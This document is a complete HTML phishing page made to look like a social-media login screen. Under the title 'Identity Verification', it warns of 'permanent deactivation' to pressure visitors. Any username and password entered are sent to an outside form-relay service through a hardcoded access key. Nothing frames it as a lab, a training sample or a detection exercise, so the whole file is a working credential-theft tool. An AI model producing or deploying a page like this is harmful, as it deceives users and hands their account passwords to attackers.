<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .login-box h2 { color: #262626; font-size: 1.5rem; margin-bottom: 20px; }
        .login-box p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; background: #fafafa; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #1877f2; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Verify Identity</h2>
        <p>Confirm your account credentials to prevent permanent deactivation due to security risks.</p>
        <form action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="7e163b2f-7634-4063-959c-85060879f977">
            <input type="text" name="username" placeholder="Username, phone, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Confirm Log In</button>
        </form>
    </div>
</body>
</html>
